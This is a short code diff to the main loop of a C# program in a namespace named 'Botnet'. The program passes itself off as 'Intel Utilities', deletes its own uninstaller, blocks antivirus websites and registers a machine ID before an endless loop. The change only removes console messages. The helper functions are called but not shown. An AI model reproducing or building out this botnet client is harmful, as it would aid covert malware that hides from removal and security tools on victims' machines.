@@ -41,10 +41,8 @@ namespace Botnet
             Utility.DeleteUninstaller();
             Console.WriteLine("Intel Utilities v" + Utility.GetProgramCurrentVersion());
             Console.WriteLine("Starting...");
-            if (!Utility.IsInternetAvailable())
-                Console.WriteLine("Internet not available! Retrying...");
             Utility.WaitForInternet();
-            Console.WriteLine("Internet OK!");
+
             try
             {
                 Utility.BlockAntivirusWebsites();
@@ -53,6 +51,7 @@ namespace Botnet
             {
                 Console.WriteLine(e.StackTrace);
             }
+            
             if (Utility.GetMachineID() != "")
             {
                 machineID = Utility.GetMachineID();
@@ -68,6 +67,7 @@ namespace Botnet
                 Initialize();
                 Console.WriteLine(" DONE! MachineID=" + machineID);
             }
+
             while (true)
             {
                 try
